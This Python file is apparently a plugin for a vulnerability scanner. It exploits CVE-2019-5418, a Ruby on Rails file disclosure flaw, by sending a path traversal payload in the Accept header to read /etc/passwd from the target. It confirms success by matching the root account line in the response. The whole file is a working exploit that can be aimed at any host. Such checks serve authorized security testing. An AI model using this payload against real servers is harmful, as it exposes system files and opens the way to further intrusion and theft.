from utils.status import *
from .helper import Plugin,utils

class CVE_2019_5418(Plugin):
    def __init__(self):
        self.name        = "Ruby on Rails LFI - CVE_2019_5418"
        self.enable      = True
        self.description = ""

    def presquites(self, host):
        if utils.isalive( utils.uri(host) ):
            return True
        return False

    def main(self,host):
        poc     = utils.uri(host)
        request = utils.requests.get(poc, headers={
            'Accept':'../../../../../../../../../../etc/passwd{{'
        })

        if 'root:x:0:0:root' in request.text:

            return Result(
                status   = SUCCESS,
                msg      = poc,
                request  = utils.dump_request(request),
                response = utils.dump_response(request)
            )
            
        return Result(FAILED,None,utils.dump_request(request),utils.dump_response(request))